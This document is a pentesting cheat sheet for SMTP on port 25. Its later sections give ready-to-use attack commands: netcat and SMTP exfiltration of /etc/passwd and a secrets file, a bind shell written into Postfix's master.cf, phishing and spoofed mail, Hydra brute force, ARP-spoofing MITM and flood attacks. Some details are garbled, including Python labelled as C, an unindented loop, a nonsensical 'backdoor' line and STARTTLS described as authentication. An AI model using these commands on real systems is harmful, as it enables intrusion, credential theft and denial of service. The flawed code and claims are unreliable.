# P25 SMTP

## Index

* \[\[Ports, Protocols, and Services]]
  * \[\[P587 SMTPS]]

## Simple Mail Transfer Protocol (SMTP)

* **Port Number:** 25 (default), 587 (submission), 465 (SMTPS - deprecated)
* **Protocol:** TCP
* **Service Name:** Simple Mail Transfer Protocol (SMTP)
* **Defined in:** RFC 5321 (current), RFC 821 (original)

The Simple Mail Transfer Protocol (SMTP) is a protocol for sending email messages between servers. It is a cornerstone of email transmission across the Internet and has been in use since the early 1980s. SMTP operates on port 25 by default, but modern implementations also use port 587 for submission and, historically, port 465 for SMTPS (secure SMTP). SMTP is defined in RFC 5321, which outlines the protocol's specifications and commands.

### Overview of Features

* **Server-to-Server Communication:** SMTP is primarily used for the transmission of email between mail servers.
* **Client-to-Server Submission:** Port 587 is designated for email submission by clients to mail servers, allowing for authenticated and secure email transmission.
* **Plain Text Transmission:** SMTP transmits data in plain text, making it susceptible to interception and requiring additional security layers like TLS.
* **Command-Based Protocol:** SMTP operates through a series of commands sent by the client and responses from the server. These commands include `HELO`, `MAIL FROM`, `RCPT TO`, `DATA`, and `QUIT`.
* **Support for Authentication:** Modern SMTP implementations support authentication mechanisms, such as STARTTLS, to provide secure transmission over otherwise unencrypted channels.
* **Extensible:** SMTP supports a range of extensions (e.g., ESMTP) that enhance its capabilities, including support for binary data transmission and larger message sizes.

### Typical Use Cases

* **Email Delivery:** SMTP is the primary protocol used by mail servers to deliver emails from one server to another across the Internet.
* **Email Submission:** Clients (email applications) use SMTP to submit outbound emails to a mail server, typically using port 587 for secure submission.
* **Email Relaying:** SMTP servers can relay emails to other servers, acting as intermediaries in the email delivery process.
* **Spam Filtering and Email Security:** SMTP headers and relay paths are often analyzed for spam filtering, email authentication (e.g., SPF, DKIM), and security purposes.

### How SMTP Protocol Works

1. **Connection Establishment:**
   * **Step 1:** The client establishes a TCP connection to the SMTP server on port 25 (or 587 for submission).
   * **Step 2:** The server responds with a 220 response code, indicating that it is ready to receive commands.
2. **Client Introduction:**
   * **Step 3:** The client sends a `HELO` (or `EHLO` for ESMTP) command, introducing itself to the server.
   * **Step 4:** The server responds with a 250 response code, acknowledging the client's introduction and listing supported extensions if `EHLO` was used.
3. **Mail Transaction:**
   * **Step 5:** The client sends a `MAIL FROM` command, specifying the sender's email address.
   * **Step 6:** The server responds with a 250 response code, acknowledging the sender's address.
   * **Step 7:** The client sends a `RCPT TO` command, specifying the recipient's email address.
   * **Step 8:** The server responds with a 250 response code if the recipient is valid, or a 550 response code if the recipient is invalid.
   * **Step 9:** The client sends a `DATA` command, indicating that the email content will follow.
   * **Step 10:** The server responds with a 354 response code, indicating that it is ready to receive the data.
   * **Step 11:** The client sends the email content, ending with a single line containing only a period (`.`).
   * **Step 12:** The server responds with a 250 response code, indicating successful receipt of the message.
4. **Connection Termination:**
   * **Step 13:** The client sends a `QUIT` command to terminate the session.
   * **Step 14:** The server responds with a 221 response code, indicating that the connection will be closed.

#### Diagram (Hypothetical Example)

* **Client:** `<attack_ip>` sends email to `<target_ip>:25`
* **Server:** `<target_ip>` receives and relays the email to the recipient’s mail server.

## Additional Information

### Security Considerations

* **Plaintext Transmission:** SMTP by default transmits data in plaintext, which makes it vulnerable to interception and man-in-the-middle (MITM) attacks. This risk is mitigated by using STARTTLS to encrypt the connection.
* **Email Spoofing:** SMTP lacks strong authentication mechanisms by default, which allows for email spoofing. This has led to the development of additional technologies like SPF, DKIM, and DMARC to validate the authenticity of emails.
* **Relay Abuse:** Open relays, where an SMTP server forwards emails without proper authentication, can be exploited by spammers to send large volumes of unsolicited email.

### Alternatives and Extensions

* **ESMTP (Extended SMTP):** An extension of SMTP that allows for additional features such as binary data transmission, authentication (AUTH command), and secure transmission (STARTTLS command).
* **STARTTLS:** An extension that enables the upgrading of an existing plaintext connection to an encrypted one using TLS, providing confidentiality and integrity to SMTP communications.
* **SMTPS (Port 465):** Originally designated for SMTP over SSL, this port has been deprecated in favor of STARTTLS on port 587. However, some legacy systems may still use port 465 for secure email submission.

### Modes of Operation

* **Submission Mode (Port 587):** Clients authenticate to the SMTP server to submit outgoing emails securely, typically requiring STARTTLS for encryption.
* **Relay Mode:** Servers relay emails to each other without necessarily authenticating the sending client, which requires careful configuration to avoid becoming an open relay.

### Configuration Files

1. **Postfix Configuration (Example):**

* **File Location:** `/etc/postfix/main.cf`
*   **Configuration Example:**

    ```bash
    # Basic SMTP settings
    myhostname = mail.example.com
    mydomain = example.com
    myorigin = $mydomain
    inet_interfaces = all
    inet_protocols = ipv4

    # Relay settings
    relayhost = [smtp.relay.example.com]:587
    smtp_use_tls = yes
    smtp_tls_security_level = encrypt
    smtp_tls_note_starttls_offer = yes

    # SASL authentication
    smtp_sasl_auth_enable = yes
    smtp_sasl_password_maps = hash:/etc/postfix/sasl_passwd
    smtp_sasl_security_options = noanonymous
    ```
* **Key Settings:**
  * `myhostname`: Specifies the hostname of the SMTP server.
  * `relayhost`: Defines the relay server for outgoing mail.
  * `smtp_use_tls`: Enables TLS for secure transmission.
  * `smtp_sasl_auth_enable`: Enables SMTP authentication.

2. **Sendmail Configuration (Example):**

* **File Location:** `/etc/mail/sendmail.mc`
* **Configuration Example:**

```bash
define(`SMART_HOST', `smtp.relay.example.com')dnl
define(`confAUTH_OPTIONS', `A p')dnl
FEATURE(`authinfo', `hash -o /etc/mail/authinfo.db')dnl
```

* **Key Settings:**
  * `SMART_HOST`: Defines the relay server for outgoing mail.
  * `confAUTH_OPTIONS`: Configures authentication options.
  * `FEATURE('authinfo')`: Enables authentication for relaying.

### Potential Misconfigurations

1. **Open Relay Configuration:**
   * **Risk:** If an SMTP server is configured as an open relay, it can be abused by spammers to send unsolicited emails.
   * **Exploitation:** Attackers can use the open relay to anonymously send large volumes of spam, leading to blacklisting of the server.
2. **Weak Authentication Mechanisms:**
   * **Risk:** Using weak or no authentication mechanisms can allow unauthorized users to send emails through the SMTP server.
   * **Exploitation:** Attackers could send phishing emails or impersonate legitimate users, leading to potential data breaches or credential theft.
3. **Misconfigured STARTTLS:**
   * **Risk:** If STARTTLS is not properly configured, it might fall back to plaintext transmission, exposing email content to eavesdropping.
   * **Exploitation:** Attackers can intercept and read email contents if the connection is not encrypted.

### Default Credentials

SMTP itself does not have default credentials; however, SMTP services often integrate with user databases (e.g., LDAP, Active Directory) for authentication. Default credentials for these integrations should be carefully managed to prevent unauthorized access.

## Interaction and Tools

### Tools

#### \[\[SMTP]]

*   **EHLO (Extended SMTP):** Introduces the client to the server and requests a list of supported extensions.

    ```bash
    EHLO <hostname>
    ```
*   **MAIL FROM:** Specifies the sender’s email address.

    ```bash
    MAIL FROM:<sender@example.com>
    ```
*   **RCPT TO:** Specifies the recipient’s email address.

    ```bash
    RCPT TO:<recipient@example.com>
    ```
*   **DATA:** Indicates the start of the email content. The email body is terminated with a single line containing only a period (`.`).

    ```bash
    DATA
    ```
*   **QUIT:** Terminates the SMTP session.

    ```bash
    QUIT
    ```
*   **VRFY (Verify):** Requests verification of an email address or username on the server. This command is often disabled to prevent information disclosure.

    ```bash
    VRFY <username>
    ```
*   **EXPN (Expand):** Requests a list of recipients for a mailing list. Like VRFY, this command is often disabled to prevent information disclosure.

    ```bash
    EXPN <mailing-list>
    ```
*   **RSET (Reset):** Resets the current mail transaction, allowing the client to start a new one without terminating the connection.

    ```bash
    RSET
    ```
*   **AUTH (Authentication):** Initiates the SMTP authentication process. The server typically responds with a prompt for the username and password, which are base64 encoded.

    ```bash
    AUTH LOGIN
    ```
*   **STARTTLS:** Requests the server to upgrade the connection to a secure TLS-encrypted connection.

    ```bash
    STARTTLS
    ```
*   **Example SMTP Session:**

    ```bash
    telnet <target_ip> 25
    EHLO example.com
    MAIL FROM:<user@example.com>
    RCPT TO:<recipient@example.com>
    DATA
    Subject: Test Email

    This is a test email.
    .
    QUIT
    ```

#### \[\[Telnet]]

*   **Telnet Connect:** Telnet can be used to manually interact with an SMTP server, sending commands and receiving responses.

    ```bash
    telnet <target_ip> 25
    ```

#### \[\[OpenSSL]]

*   **SMTP Connect:**

    ```bash
    openssl s_client -starttls smtp -connect <target_ip>:587
    ```

### Exploitation Tools

#### \[\[Metasploit]]

#### \[\[Wireshark]]

*   **Wireshark Packet Capture:**

    ```bash
    wireshark -i <interface> -f "tcp port 25"
    ```

#### \[\[Nmap]]

*   **Basic Nmap Scan:** Scan target on specified port to verify if service is on.

    ```bash
    nmap <target_ip> -p 25
    ```

#### \[\[NetCat]]

*   **Netcat TCP Connect:** Simple test to verify port service is running and responding.

    ```bash
    nc <target_ip> 25
    ```
*   **Netcat UDP Connect:** Simple test to verify port service is running and responding.

    ```bash
    nc <target_ip> 25 -u
    ```
*   **Execute Commands:** Execute commands on target.

    ```bash
    echo "<command>" | nc <target_ip> 25
    ```
*   **Exfiltrate Data:** Exfiltrate data over specified port.

    ```bash
    nc <target_ip> 25 < secret_data.txt
    ```
*   **Send Email:** Automating SMTP interactions for testing or exploitation.

    ```bash
    echo -e "EHLO example.com\nMAIL FROM:<sender@example.com>\nRCPT TO:<recipient@example.com>\nDATA\nSubject: Test\n\nThis is a test email.\n.\nQUIT" | nc <target_ip> 25
    ```

#### \[\[SoCat Cheat Sheet]]

*   **Socat TCP Connect:** Simple test to verify port service is running and responding.

    ```bash
    socat - TCP:<target_ip>:25
    ```

#### \[\[HPing3 Cheat Sheet]]

*   **Send UDP Packet:** Send a single UDP packet to the service.

    ```bash
    hping3 -2 <target_ip> -p 25 -c 1
    ```

#### \[\[SMTP-User-Enum]]

*   **Enumeration:** Enumerating valid email addresses or usernames on a target SMTP server by exploiting the `VRFY` and `EXPN` commands.

    ```bash
    smtp-user-enum -M VRFY -U <username_list> -D <target_domain> -t <target_ip> -p <target_port>
    smtp-user-enum -M EXPN -U <username_list> -D <target_domain> -t <target_ip> -p <target_port>
    smtp-user-enum -M RCPT -U <username_list> -D <target_domain> -t <target_ip> -p <target_port>
    smtp-user-enum -M VRFY -U <username_list> -D <target_domain> -t <target_ip> -p <target_port>
    ```

### Other Techniques

#### SMTP via Email Clients

* **Description:** Leverage GUI email clients to access SMTP.
  * **\[\[Evolution]]**
  * **\[\[Thunderbird]]**
  * **\[\[Microsoft Outlook]]**

#### Sending Email via Custom Script

*   **Tool:** \[\[Custom Scripts]]

    ```bash
    echo -e "EHLO domain.com\r\nAUTH LOGIN\r\n$(echo -n 'username' | base64)\r\n$(echo -n 'password' | base64)\r\nMAIL FROM:<user@domain.com>\r\nRCPT TO:<recipient@domain.com>\r\nDATA\r\nSubject: Test\r\nThis is a test message.\r\n.\r\nQUIT\r\n" | openssl s_client -connect <target_ip>:587 -crlf
    ```

    ```c
    import smtplib
    from email.mime.text import MIMEText

    msg = MIMEText('This is a test email')
    msg['Subject'] = 'Test'
    msg['From'] = 'sender@example.com'
    msg['To'] = 'recipient@example.com'

    with smtplib.SMTP_SSL('<target_ip>', 465) as server:
        server.login('user', 'password')
        server.sendmail('sender@example.com', 'recipient@example.com', msg.as_string())
    ```

#### Email Spoofing

*   **Description:** Sending emails with forged sender addresses.

    * Use a misconfigured SMTP server to send spoofed emails.
    * Example command:

    ```bash
    telnet <target_ip> 25
    HELO example.com
    MAIL FROM:<spoofed@example.com>
    RCPT TO:<victim@example.com>
    DATA
    Subject: Spoofed Email
    This email appears to come from a legitimate source.
    .
    QUIT
    ```

## Penetration Testing Techniques

### External Reconnaissance

#### Port Scanning

*   **Tool:** \[\[Nmap]]

    ```bash
    nmap <target_ip> -p 25,587,465
    ```
* **Description:** Identifies if the target service is running on the target by scanning target port.

#### Service Enumeration

*   **Tool:** \[\[NetCat]]

    ```bash
    nc <target_ip> 25
    ```
* **Description:** Retrieves the service banner to identify the software version and potential vulnerabilities.

#### SMTP Enumeration

*   **Tool:** \[\[SMTP-User-Enum]]

    ```bash
    smtp-user-enum -M VRFY -U users.txt -t <target_ip>
    ```
* **Description:** Enumerates valid users on the SMTP server by exploiting commands like `VRFY` and `EXPN`.

### Initial Access

#### Exploiting Open Relay

*   **Tool:** \[\[Metasploit]]

    ```bash
    use auxiliary/scanner/smtp/smtp_open_relay
    set RHOSTS <target_ip>
    run
    ```
* **Description:** Exploits an open SMTP relay to send emails without authentication, which can be used to spoof emails or send spam.

#### Phishing via Compromised SMTP

*   **Tool:** \[\[Custom Scripts]]

    ```bash
    echo -e "EHLO example.com\nMAIL FROM:<compromised@example.com>\nRCPT TO:<victim@example.com>\nDATA\nSubject: Urgent Update\n\nClick here to update your password.\n.\nQUIT" | nc <target_ip> 25
    ```
* **Description:** Sends phishing emails from a compromised SMTP server, potentially leading to credential theft or further network compromise.

### Persistence

#### Backdooring SMTP Scripts

*   **Tool:** \[\[Custom Scripts]]

    ```bash
    echo 'echo "MAIL FROM:<backdoor@example.com>" >> /etc/mail/scripts.sh' >> /etc/mail/scripts.sh
    ```
* **Description:** Modifies SMTP handling scripts to include a backdoor, allowing for persistent unauthorized access.

#### SMTP Backdoor

*   **Tool:** \[\[Custom Scripts]], \[\[Metasploit]]

    ```bash
    use auxiliary/server/smtp_backdoor
    set SRVHOST <target_ip>
    run
    ```
* **Description:** Establishes a backdoor via SMTP for persistent access.

### Credential Harvesting

#### Packet Capture

*   **Tool:** \[\[Wireshark]]

    ```bash
    wireshark -i <interface> -f "tcp port 25"
    ```
* **Description:** Capture traffic and extract plaintext credentials (if STARTTLS is not used).

#### Man-in-the-Middle (MITM) Attack

*   **Tool:** \[\[ettercap]], \[\[BetterCap Cheat Sheet]]

    ```bash
    ettercap -T -q -M arp:remote /<target_ip>/ /<smtp_server_ip>/
    ```
* **Description:** Intercept and analyze traffic between the client and server, potentially capturing credentials by performing an ARP spoofing attack.

### Privilege Escalation

#### Exploiting Misconfigured SMTP Permissions

*   **Tool:** \[\[Custom Scripts]]

    ```bash
    echo 'nc -lvp 4444 -e /bin/bash' >> /etc/postfix/master.cf
    ```
* **Description:** Modifies SMTP configuration files or scripts to escalate privileges on the server.

### Internal Reconnaissance

#### Identifying Internal Mail Servers

*   **Tool:** \[\[Nmap]]

    ```bash
    nmap <internal_ip_range> -p 25,587 -sV --script=smtp-commands
    ```
* **Description:** Scans the internal network to identify and enumerate SMTP servers and their configurations.

### Lateral Movement, Pivoting, and Tunnelling

#### SMTP Pivoting

*   **Tool:** \[\[SSH]], \[\[NetCat]]

    ```bash
    ssh -L 587:<target_ip>:25 <intermediate_host>
    ```
* **Description:** Uses an intermediate host to pivot through SMTP services for lateral movement within the network.

### Defense Evasion

#### Obfuscating SMTP Headers

*   **Tool:** \[\[Custom Scripts]], \[\[Email Clients]]

    ```bash
    echo -e "EHLO example.com\nMAIL FROM:<spoofed@example.com>\nRCPT TO:<victim@example.com>\nDATA\nSubject: Test\nX-Header: Obfuscated\n.\nQUIT" | nc <target_ip> 25
    ```
* **Description:** Injects custom headers into emails to evade detection by security mechanisms.

### Data Exfiltration

#### Exfiltrating Data via SMTP

*   **Tool:**\[\[ Custom Scripts]], \[\[NetCat]]

    ```bash
    echo -e "EHLO example.com\nMAIL FROM:<attacker@example.com>\nRCPT TO:<attacker@example.com>\nDATA\nSubject: Exfiltration\n\n$(cat /etc/passwd)\n.\nQUIT" | nc <target_ip> 25
    ```

\


*   **Tool:** \[\[Custom Scripts]],

    ```bash
    import smtplib
    from email.mime.text import MIMEText

    msg = MIMEText("Sensitive data exfiltrated")
    msg['Subject'] = "Exfil Data"
    msg['From'] = "attacker@example.com"
    msg['To'] = "recipient@example.com"

    s = smtplib.SMTP('<target_ip>')
    s.sendmail(msg['From'], [msg['To']], msg.as_string())
    s.quit()
    ```
* **Description:** Sends sensitive data through SMTP emails to an external address, bypassing traditional file transfer monitoring.

## Exploits and Attacks

### Password Attacks

#### Password Brute Force

*   **Tool:** \[\[Hydra Cheat Sheet]]

    ```bash
    hydra smtp://<target_ip> -s 25 -l <username> -P <password_list>
    ```
* **Description:** Test a single username against multiple passwords.

#### Password Spray

*   **Tool:** \[\[Hydra Cheat Sheet]]

    ```bash
    hydra smtp://<target_ip> -s 25 -l <username_list> -P <password>
    ```
* **Description:** Test a multiple usernames against a single password.

#### Credential Stuffing

*   **Tool:** \[\[Custom Scripts]], \[\[NetCat]]

    ```bash
    while read p; do echo -e "AUTH LOGIN\n$(echo $p | base64)" | nc <target_ip> 587; done < passwords.txt
    ```
* **Description:** Attempts to authenticate using a list of known usernames and passwords, exploiting reused credentials.

### Denial of Service

#### TCP/UPD Flood Attack

*   **Tool:** \[\[HPing3 Cheat Sheet]]

    ```bash
    hping3 <target_ip> -p <target_port> --flood --rand-source -c 1000
    ```
* **Description:** Flooding the port with connection attempts, potentially leading to a denial of service.

#### TCP/UDP Reflection Attack

*   **Tool:** \[\[HPing3 Cheat Sheet]]

    ```bash
    hping3 <target_ip_1> -p <target_port> --spoof <target_ip_2> --flood --rand-source -c 1000
    ```
* **Description:** Execute a reflection attack by sending requests with a spoofed source IP, causing the target to flood the victim with responses.

#### SMTP Email Flood

*   **Tool:** \[\[NetCat]]

    ```bash
    while true; do echo -e "EHLO example.com\nMAIL FROM:<attacker@example.com>\nRCPT TO:<victim@example.com>\nDATA\nFlood\n.\nQUIT" | nc <target_ip> 25; done
    ```
* **Description:** Floods the SMTP server with emails, overwhelming its processing capacity and potentially leading to a denial of service.

#### Exhausting Email Quota

*   **Tool:** \[\[Custom Scripts]]

    ```bash
    for _ in range(100000):
    msg = MIMEText("Flood email")
    msg['Subject'] = "Flood"
    msg['From'] = "attacker@example.com"
    msg['To'] = "victim@example.com"

    s = smtplib.SMTP('<target_ip>')
    s.sendmail(msg['From'], [msg['To']], msg.as_string())
    s.quit()
    ```
* **Description:** Send massive amounts of email to a target user to exhaust their storage quota or overwhelm the mail server.

#### Resource Exhaustion Attack

*   **Tool:** \[\[Metasploit]]

    ```bash
    use auxiliary/dos/smtp/smtp_flood
    set RHOST <target_ip>
    run
    ```
* **Description:** Exploits the server’s resources by sending a high volume of emails with large attachments, leading to disk or memory exhaustion.

### Exploits

#### Open Relay Exploit

*   **Tool:** \[\[Metasploit]]

    ```bash
    use auxiliary/scanner/smtp/smtp_open_relay
    set RHOSTS <target_ip>
    run
    ```
* **Description:** Exploits SMTP servers configured as open relays to send spoofed emails without authentication.

#### STARTTLS Downgrade Attack

*   **Tool:** \[\[Custom Scripts]], \[\[NetCat]]

    ```bash
    echo -e "EHLO example.com\nSTARTTLS\n" | nc <target_ip> 25
    ```
* **Description:** Exploits misconfigurations in STARTTLS to force the server to downgrade to plaintext transmission, enabling interception of sensitive data.

## Resources

| **Website**               | **URL**                                             |
| ------------------------- | --------------------------------------------------- |
| RFC 5321 (SMTP)           | https://tools.ietf.org/html/rfc5321                 |
| Postfix Documentation     | http://www.postfix.org/documentation.html           |
| Sendmail Documentation    | http://www.sendmail.org/doc                         |
| Nmap SMTP Scripts         | https://nmap.org/nsedoc/categories/smtp.html        |
| Hydra Documentation       | https://tools.kali.org/password-attacks/hydra       |
| Metasploit SMTP Modules   | https://www.rapid7.com/db/modules/                  |
| Wireshark User Guide      | https://www.wireshark.org/docs/wsug\_html\_chunked/ |
| SMTP VRFY/EXPN Tools      | https://github.com/pentestmonkey/smtp-user-enum     |
| Email Security Guidelines | https://www.owasp.org/index.php/Email\_Security     |
